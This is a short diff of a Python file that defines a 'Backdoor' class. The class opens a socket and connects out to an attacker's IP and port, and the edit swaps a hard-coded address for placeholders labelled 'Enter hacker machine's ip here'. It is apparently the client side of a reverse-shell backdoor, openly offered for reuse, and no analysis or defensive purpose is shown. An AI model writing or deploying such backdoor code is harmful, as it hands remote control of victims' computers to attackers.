@@ -8,7 +8,6 @@ class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
-        # self.connection.send(b'Hello, Server!\n')
 
     def reliable_send(self, data):
         try:
@@ -73,5 +72,5 @@ class Backdoor:
 
 
 
-my_backdoor = Backdoor("172.25.247.219", 5555)
+my_backdoor = Backdoor("Enter hacker machine's ip here", "Enter port number here as integer")
 my_backdoor.run()
